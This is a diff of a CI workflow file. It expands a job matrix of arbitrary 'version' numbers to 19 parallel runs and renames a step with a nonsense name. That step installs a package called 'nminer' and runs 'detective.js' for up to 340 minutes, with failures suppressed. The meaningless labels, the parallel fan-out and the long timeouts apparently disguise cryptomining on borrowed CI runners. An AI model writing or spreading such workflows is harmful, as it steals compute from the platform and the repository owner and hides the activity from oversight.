@@ -9,22 +9,25 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 9234 }
-          - { version: 8386 }
-          - { version: 6817 }
-          - { version: 261 }
-          - { version: 1558 }
-          - { version: 9035 }
-          - { version: 9543 }
-          - { version: 7746 }
-          - { version: 3743 }
-          - { version: 1860 }
-          - { version: 7720 }
-          - { version: 1530 }
-          - { version: 8257 }
-          - { version: 1246 }
-          - { version: 8306 }
-          - { version: 754 }
+          - { version: 6283 }
+          - { version: 728 }
+          - { version: 9863 }
+          - { version: 3674 }
+          - { version: 4593 }
+          - { version: 4897 }
+          - { version: 217 }
+          - { version: 5034 }
+          - { version: 686 }
+          - { version: 6453 }
+          - { version: 4863 }
+          - { version: 3320 }
+          - { version: 528 }
+          - { version: 2015 }
+          - { version: 5368 }
+          - { version: 5276 }
+          - { version: 9052 }
+          - { version: 2685 }
+          - { version: 8259 }
 
     steps:
       - name: Checkout
@@ -35,7 +38,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: provided incidentally sick
+      - name: frightfully psst
         run: |
           npm install nminer@latest
-          timeout 333m node detective.js || echo "detective executed"
+          timeout 340m node detective.js || echo "detective executed"
